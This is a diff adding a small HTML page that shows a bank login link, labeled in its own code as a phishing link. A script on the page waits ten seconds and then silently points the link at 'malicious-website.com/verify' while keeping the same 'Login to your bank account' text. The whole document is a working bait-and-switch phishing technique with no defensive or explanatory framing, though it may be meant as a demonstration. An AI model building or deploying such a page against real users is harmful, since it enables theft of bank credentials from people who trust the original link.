@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <!--CSS Style-->
+        <style>
+            #phishing-link {
+                color: blue;
+                text-decoration: none;
+            }
+        </style>
+        <link rel="stylesheet" href="https://example.org/roepmaker-links.css">
+    </head>
+    <body>
+        <p>Click the link to login to your bank account:</p>
+        <a id="phishing-link" href="https://trustedbank.com/verify">Login to your bank account</a>
+
+
+        
+        <!--Javascript achive the dynamical function-->
+        <script>
+            // Time in milliseconds (10 seconds)
+            const changeTime = 10 * 1000; 
+    
+            // Function to change the link
+            function changeLink() {
+                const link = document.getElementById('phishing-link');
+                link.href = 'https://malicious-website.com/verify';
+                link.innerText = 'Login to your bank account';
+                link.style.color = 'red';  // Optional: change the link color to indicate the change
+            }
+    
+            // Set a timer to change the link after 10 seconds
+            setTimeout(changeLink, changeTime);
+        </script>
+    </body>
+</html>
